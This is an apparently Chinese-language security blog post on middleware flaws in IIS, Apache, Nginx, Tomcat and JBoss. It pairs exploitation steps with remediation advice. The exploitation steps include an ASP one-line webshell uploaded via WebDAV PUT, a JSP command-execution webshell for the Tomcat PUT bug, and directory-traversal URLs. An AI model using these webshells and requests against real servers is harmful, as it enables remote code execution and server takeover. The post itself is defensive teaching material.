toc-level-1"><a class="toc-link" href="#Nginx漏洞分析"><span class="toc-number">5.</span> <span class="toc-text">Nginx漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nginx简介"><span class="toc-number">5.1.</span> <span class="toc-text">Nginx简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件解析"><span class="toc-number">5.2.</span> <span class="toc-text">文件解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因-4"><span class="toc-number">5.2.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现"><span class="toc-number">5.2.2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复-4"><span class="toc-number">5.2.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#目录遍历-1"><span class="toc-number">5.3.</span> <span class="toc-text">目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因-5"><span class="toc-number">5.3.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复-5"><span class="toc-number">5.3.2.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#目录穿越"><span class="toc-number">5.4.</span> <span class="toc-text">目录穿越</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因-6"><span class="toc-number">5.4.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞测试-3"><span class="toc-number">5.4.2.</span> <span class="toc-text">漏洞测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复"><span class="toc-number">5.4.3.</span> <span class="toc-text">修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat漏洞分析"><span class="toc-number">6.</span> <span class="toc-text">Tomcat漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-number">6.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#远程代码执行"><span class="toc-number">6.2.</span> <span class="toc-text">远程代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因-7"><span class="toc-number">6.2.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞测试-4"><span class="toc-number">6.2.2.</span> <span class="toc-text">漏洞测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复-6"><span class="toc-number">6.2.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#war后门文件部署"><span class="toc-number">6.3.</span> <span class="toc-text">war后门文件部署</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因-8"><span class="toc-number">6.3.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞测试-5"><span class="toc-number">6.3.2.</span> <span class="toc-text">漏洞测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复-7"><span class="toc-number">6.3.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JBoss漏洞分析"><span class="toc-number">7.</span> <span class="toc-text">JBoss漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JBoss简介"><span class="toc-number">7.1.</span> <span class="toc-text">JBoss简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化漏洞"><span class="toc-number">7.2.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复-8"><span class="toc-number">7.2.1.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#war后门文件部署-1"><span class="toc-number">7.3.</span> <span class="toc-text">war后门文件部署</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因-9"><span class="toc-number">7.3.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JBoss漏洞防护"><span class="toc-number">7.3.2.</span> <span class="toc-text">JBoss漏洞防护</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WebLogic漏洞分析"><span class="toc-number">8.</span> <span class="toc-text">WebLogic漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WebLogic简介"><span class="toc-number">8.1.</span> <span class="toc-text">WebLogic简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化漏洞-1"><span class="toc-number">8.2.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因-10"><span class="toc-number">8.2.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复-1"><span class="toc-number">8.2.2.</span> <span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">8.3.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞测试-6"><span class="toc-number">8.3.1.</span> <span class="toc-text">漏洞测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复-2"><span class="toc-number">8.3.2.</span> <span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#任意文件上传"><span class="toc-number">8.4.</span> <span class="toc-text">任意文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞测试-7"><span class="toc-number">8.4.1.</span> <span class="toc-text">漏洞测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复-3"><span class="toc-number">8.4.2.</span> <span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#war后门文件部署-2"><span class="toc-number">8.5.</span> <span class="toc-text">war后门文件部署</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#修复-4"><span class="toc-number">8.5.1.</span> <span class="toc-text">修复</span></a></li></ol></li></ol></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(/img/default.jpg)"><div id="post-info"><div id="post-title"><div class="posttitle">中间件漏洞</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 发表于 2019-05-09<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> 更新于 2019-05-23</time><span class="post-meta__separator">|</span><span><i class="fa fa-inbox post-meta__icon fa-fw" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/中间件/">中间件</a></span><div class="post-meta-wordcount"><div class="post-meta-pv-cv"><span><i class="fa fa-eye post-meta__icon fa-fw" aria-hidden="true"> </i>阅读量:</span><span id="busuanzi_value_page_pv"></span></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><p>中间件漏洞可以说是最容易被web管理员忽视的漏洞，因为这不是程序代码上的漏洞，而是属于一种应用部署环境的配置不当或者使用不当造成的。<br><a id="more"></a></p>
<h1 id="中间件、容器、服务器"><a href="#中间件、容器、服务器" class="headerlink" title="中间件、容器、服务器"></a>中间件、容器、服务器</h1><p>中间件、容器、服务器、webserver等概念其实挺相似。</p>
<h2 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h2><p>web服务器用于提供http服务，向客户端返回信息，可以处理http协议，响应针对静态页面或图片请求，控制页面跳转，或者把动态请求委托其他程序（中间件程序）等</p>
<h2 id="web中间件"><a href="#web中间件" class="headerlink" title="web中间件"></a>web中间件</h2><p>web中间件用于提供系统软件和应用软件之间的连接，以便于软件各部件之间的沟通，其可以为一种或多种应用程序提供容器。</p>
<h2 id="web容器"><a href="#web容器" class="headerlink" title="web容器"></a>web容器</h2><p>web容器用于给处于其中的应用程序组件（JSP，SERVLET）提供一个环境，是中间件的一个组成部分，它实现了对动态语言的解析。比如tomcat可以解析jsp，是因为其内部有一个jsp容器。</p>
<p>所属类别：<br>web服务器：IIS、Apache、nginx、tomcat、weblogic、websphere等。<br>web中间件：apache tomcat、BEA WebLogic、IBM WebSphere等。<br>web容器：JSP容器、SERVLET容器、ASP容器等。</p>
<blockquote>
<p>web中间件与web服务器是有重叠的，原因在于tomcat等web中间件也具备web服务器的功能。</p>
</blockquote>
<p>web服务器只是提供静态网页解析（如apache），或者提供跳转的这么一种服务。而web中间件（其包含web容器）可以解析动态语言，比如tomcat可以解析jsp（因为tomcat含有jsp容器）,也可以解析静态资源，因此它既是web中间件也是web服务器。不过tomcat解析静态资源的速度不如apache，因此常常两者结合使用。</p>
<h1 id="常见web中间件及其漏洞概述"><a href="#常见web中间件及其漏洞概述" class="headerlink" title="常见web中间件及其漏洞概述"></a>常见web中间件及其漏洞概述</h1><h2 id="一）-IIS"><a href="#一）-IIS" class="headerlink" title="一） IIS"></a>一） IIS</h2><p>1、PUT漏洞</p>
<p>2、短文件名猜解</p>
<p>3、远程代码执行</p>
<p>4、解析漏洞</p>
<h2 id="（二）-Apache"><a href="#（二）-Apache" class="headerlink" title="（二） Apache"></a>（二） Apache</h2><p>1、解析漏洞</p>
<p>2、目录遍历</p>
<h2 id="（三）-Nginx"><a href="#（三）-Nginx" class="headerlink" title="（三） Nginx"></a>（三） Nginx</h2><p>1、文件解析</p>
<p>2、目录遍历</p>
<p>3、CRLF注入</p>
<p>4、目录穿越</p>
<h2 id="（四）Tomcat"><a href="#（四）Tomcat" class="headerlink" title="（四）Tomcat"></a>（四）Tomcat</h2><p>1、远程代码执行</p>
<p>2、war后门文件部署</p>
<h2 id="（五）jBoss"><a href="#（五）jBoss" class="headerlink" title="（五）jBoss"></a>（五）jBoss</h2><p>1、反序列化漏洞</p>
<p>2、war后门文件部署</p>
<h2 id="（六）WebLogic"><a href="#（六）WebLogic" class="headerlink" title="（六）WebLogic"></a>（六）WebLogic</h2><p>1、反序列化漏洞</p>
<p>2、SSRF</p>
<p>3、任意文件上传</p>
<p>4、war后门文件部署</p>
<h2 id="（七）其它中间件相关漏洞"><a href="#（七）其它中间件相关漏洞" class="headerlink" title="（七）其它中间件相关漏洞"></a>（七）其它中间件相关漏洞</h2><p>1、FastCGI未授权访问、任意命令执行</p>
<p>2、PHPCGI远程代码执行</p>
<h1 id="IIS漏洞分析"><a href="#IIS漏洞分析" class="headerlink" title="IIS漏洞分析"></a>IIS漏洞分析</h1><h2 id="IIS简介"><a href="#IIS简介" class="headerlink" title="IIS简介"></a>IIS简介</h2><p>IIS（Internet Information Services），意为互联网信息服务。是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。最初是Windows NT版本的可选包，随后内置在Windows 2000、Windows XP Professional和Windows Server 2003一起发行，但在Windows XP Home版本上并没有IIS。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p>
<p>IIS具有安全脆弱性，一旦出现远程执行漏洞将会很严重。这个漏洞存在于HTTP协议堆栈（HTTP.sys）中，当HTTP.sys没能正确分析经特殊构造的HTTP请求时，该漏洞就会出现。利用该漏洞后攻击者可以在系统账户上下文中执行任意代码，导致IIS服务器所在机器蓝屏或读取其内存中的机密数据。</p>
<h2 id="Webdav漏洞"><a href="#Webdav漏洞" class="headerlink" title="Webdav漏洞"></a>Webdav漏洞</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>IIS Server在Web服务扩展中开启了WebDAV功能，开启后可以使用除了get，post以外的一些请求类型，例如put。如果配置不当，配置了可以写入的权限，就会造成任意文件上传。<br><strong>版本： IIS6.0</strong></p>
<h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>当测试一个站点是否存在webdav漏洞时，可以先构造一个OPTIONS请求，若返回200，则查看返回头的Allow参数中包含哪些方法（可以请求）。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS  /  HTTP/1.1</span><br><span class="line">Host:thief.one</span><br></pre></td></tr></table></figure></div>
<p>如果存在PUT方法，则可以尝试写入一个txt文件。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell.txt  HTTP/1.1</span><br><span class="line">Host:thief.one</span><br><span class="line">Content-length:30</span><br><span class="line"></span><br><span class="line">&lt;%eval request(&quot;nmask&quot;)%&gt;</span><br></pre></td></tr></table></figure></div>
<p>返回200则说明上传成功，此时可以手动访问此文件，确认是否存在。当然也有可能返回403，这表示此目录没有上传的权限，可以尝试上传到其他目录。<br>通过MOVE或COPY方法改文件后缀名。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">COPY /shell.txt  HTTP/1.1</span><br><span class="line">Host:thief.one</span><br><span class="line"></span><br><span class="line">Destination:http://thief.one/shell.asp</span><br></pre></td></tr></table></figure></div>
<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>一旦拿到shell后，可能会在WEB服务器上上传、修改或删除WEB页面、脚本和文件，从而达到网页篡改，控制服务器的目的。</p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>如果服务器不需要支持WebDAV，禁用此功能和写权限。</p>
<h2 id="短文件名猜解"><a href="#短文件名猜解" class="headerlink" title="短文件名猜解"></a>短文件名猜解</h2><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>IIS的短文件名机制，为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名，而生成的短文件名符合一定的规律，可以被暴力猜解。访问构造的某个存在的短文件名，会返回404，访问构造的不存在的短文件名，返回400。</p>
<h3 id="漏洞测试-1"><a href="#漏洞测试-1" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>测试需要通配符<em>，在windows中
</em>可以匹配n个字符（n&gt;=0）。要想判断站点是否有IIS短文件名暴力破解的漏洞，可以访问两个url比较一下。</p>
<p><code>1.http://localhost/\*~1\*\*\*\*/a.aspx</code><br><code>2.http://localhost/wang\*~1\*\*\*\*/a.aspx</code><br>使用了好几个星号是为了程序化自动猜解，逐个猜解后缀名，事实上由于星号可以匹配空，所以一个和多个星号并无区别。</p>
<p>访问一个url返回404，访问另一个 返回400.则目标站点存在漏洞。</p>
<h3 id="漏洞危害-1"><a href="#漏洞危害-1" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>1.猜解后台地址<br>2.猜敏感文件，例如备份的rar，zip，.bak,.sql等文件<br>3.在某些情形下，可以通过短文件名web直接下载对应文件</p>
<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1）升级.net framework<br>2）修改注册表禁用短文件名功能<br>    快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径：<br><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</code>，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，重启系统生效。<br>3）最好是再新建文件夹，将原网站目录内容拷贝进入新建的文件夹，使用新建的文件夹作为网站目录。<br>4）CMD关闭NTFS 8.3文件格式的支持</p>
<h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>1) 此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解；</p>
<p>2) 如果文件名本身太短（无短文件名）也是无法猜解的；</p>
<p>3) 如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；</p>
<h1 id="Apache漏洞分析"><a href="#Apache漏洞分析" class="headerlink" title="Apache漏洞分析"></a>Apache漏洞分析</h1><h2 id="apache简介"><a href="#apache简介" class="headerlink" title="apache简介"></a>apache简介</h2><p>apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。</p>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Apache文件解析漏洞与用户配置有密切关系，严格来说属于用户配置问题。<br>Apache文件解析漏洞涉及到一个解析文件的特性：<br>    apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.tyoes内），则继续向左识别，当我们请求这样一个文件：yogurt.php.abc.def<br>def无法识别，于是向左走<br>abc还是无法识别，再向左走<br>碰到了php，交给php处理这个文件</p>
<p>php|php3|phtml|php4|php5 都可被Apache解析</p>
<h3 id="漏洞测试-2"><a href="#漏洞测试-2" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>编辑一个yogurt.php.1234文件，内容为&lt;?php phpinfo();?&gt;<br>若页面显示phpinfo()的页面则说明存在漏洞</p>
<h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>.apache配置文件,禁止php.这样的文件执行,配置文件里面加入</p>
<files ~="" "\.(php.|php3.)"=""><br>Order Allow,Deny<br>Deny from all<br></files>

<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><h3 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>配置不当导致的目录遍历</p>
<h3 id="漏洞复习"><a href="#漏洞复习" class="headerlink" title="漏洞复习"></a>漏洞复习</h3><p><a href="/2019/05/10/中间件漏洞/1.png" data-fancybox="group" data-caption="" class="fancybox"><img src="/2019/05/10/中间件漏洞/1.png" alt="" title=""></a></p>
<h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>apache的httpd.conf 内容修改为</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /&gt;</span><br><span class="line">    Options +Indexes +FollowSymLinks +ExecCGI</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure></div>
<p><a href="/2019/05/10/中间件漏洞/2.png" data-fancybox="group" data-caption="" class="fancybox"><img src="/2019/05/10/中间件漏洞/2.png" alt="" title=""></a></p>
<h1 id="Nginx漏洞分析"><a href="#Nginx漏洞分析" class="headerlink" title="Nginx漏洞分析"></a>Nginx漏洞分析</h1><h2 id="Nginx简介"><a href="#Nginx简介" class="headerlink" title="Nginx简介"></a>Nginx简介</h2><p>Nginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，nginx的并发能力在同类型的网页服务器中表现较好</p>
<h2 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h2><h3 id="漏洞成因-4"><a href="#漏洞成因-4" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>对于任意文件名，在其后面加上“/文件名.php”    这个文件中的php代码就会被解析，这就是存在解析漏洞，例如原文件yogurt.jpg,如果变成yogurt.jpg/1.php 这就达成了解析攻击</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>建一个yogurt.jpg文件，里面写入phpinfo(),然后浏览器打开会发现图片是无法查看的，蓝后地址栏接着在后面添上/1.php，若页面回显的是执行phpinfo()后的页面，那么漏洞存在。</p>
<h3 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404；<br>将/etc/php5/fpm/pool.d/<a href="http://www.conf" target="_blank" rel="noopener">www.conf</a>中security.limit_ectensions后面的值设为.php</p>
<h2 id="目录遍历-1"><a href="#目录遍历-1" class="headerlink" title="目录遍历"></a>目录遍历</h2><h3 id="漏洞成因-5"><a href="#漏洞成因-5" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Nginx目录遍历与apache一样，属于配置方面的问题，配置不好的话可以导致目录遍历和源码泄露。</p>
<h3 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>将/etc/php5/fpm/pool.d/<a href="http://www.conf" target="_blank" rel="noopener">www.conf</a>中security.limit_ectensions后面的值设为.php</p>
<h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><h3 id="漏洞成因-6"><a href="#漏洞成因-6" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Nginx反向代理，静态文件存储在/home/下，而访问时需要在url中输入files，配置文件中/files没有用/闭合，导致可以穿越至上层目录。</p>
<h3 id="漏洞测试-3"><a href="#漏洞测试-3" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>访问<a href="http://ip/files/" target="_blank" rel="noopener">http://ip/files/</a><br>会出现该文件夹下的文件<br>访问<a href="http://ip/files../" target="_blank" rel="noopener">http://ip/files../</a><br>出现上级目录的很多文件，则实现目录穿越</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>Nginx的配置文件/etc/nginx/conf.d/error2.conf的/files使用/闭合。</p>
<h1 id="Tomcat漏洞分析"><a href="#Tomcat漏洞分析" class="headerlink" title="Tomcat漏洞分析"></a>Tomcat漏洞分析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
<h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><h3 id="漏洞成因-7"><a href="#漏洞成因-7" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Tomcat 运行在windows 主机上，且启用了HTTP PUT 请求方法，那么就可以构造攻击请求向服务器上传包含任意代码的jsp文件，造成任意代码执行。</p>
<p><strong>影响版本</strong>：Apache Tomcat 7.0.0 – 7.0.81</p>
<h3 id="漏洞测试-4"><a href="#漏洞测试-4" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>配置一下tomcat文件，然后开启put方法可上传文件功能。<br>tomcat文件夹下的/conf/web.xml文件插入：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line"></span><br><span class="line">           &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line"></span><br><span class="line">           &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line"></span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></table></figure></div>
<p>然后重启服务<br>访问自己的127.0.0.1:8080，bp抓包以后把请求方式改为PUT，创建一个xx.jsp,用%20转义空格</p>
<p>xx.jsp为：<br><code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;</code></p>
<p>如果响应包返回201，则成功，这时再访问127.0.0.1:8080/xx.jsp?cmd=calc<br>会弹出计算器</p>
<h3 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul>
<li>更新版本，避免自己的版本在影响范围，禁用PUT方法</li>
</ul>
<h2 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h2><h3 id="漏洞成因-8"><a href="#漏洞成因-8" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p> Tomcat支持在后台部署war文件，从而可以将webshell部署到web目录下，如果后台管理页面存在弱口令，则可以通过爆破获取密码。</p>
<h3 id="漏洞测试-5"><a href="#漏洞测试-5" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>Tomcat安装目录下conf里的tomcat-users.xml配置如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;role rolename=&quot;xxx&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;xx&quot;/&gt;</span><br><span class="line">&lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;xx&quot;/&gt;</span><br><span class="line">&lt;user username=&quot;yogurt&quot; password=&quot;yogurt&quot; roles=&quot;xxx&quot;/&gt;</span><br></pre></td></tr></table></figure></div>
<p>这试访问后台登陆，进入后台管理页面，然后就可以上传一个war包，可以试jsp后门，上传成功后解析，打开即可达到控制服务器的目的。</p>
<h3 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul>
<li>在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</li>
<li>增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制</li>
<li>删除远程部署页面或针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。</li>
</ul>
<p>4）后台管理避免弱口令。</p>
<h1 id="JBoss漏洞分析"><a href="#JBoss漏洞分析" class="headerlink" title="JBoss漏洞分析"></a>JBoss漏洞分析</h1><h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><pre><code>jBoss是一个基于J2EE的开发源代码的应用服务器。 与tomcat类似的是jboss也有远程部署平台，但是不需要登陆。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。
</code></pre><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>Java序列化，是把Java对象转化为字节序列的过程。而反序列化则是把字节序列恢复为java对象的过程。在转变的过程中，如果程序员过滤不严格就可以导致恶意构造代码的实现。</p>
<p>启动jboss后，攻击机访问靶机服务（8080），若访问/invoker/readonly  返回500，说明此页面有反序列化漏洞。</p>
<h3 id="漏洞修复-8"><a href="#漏洞修复-8" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>升级到JBOSS AS7版本临时解决方案：</p>
<ul>
<li>不需要http-invoker.sar组件的用户可直接删除此组件</li>
<li>用于对httpinvoker组件进行访问控制。</li>
</ul>
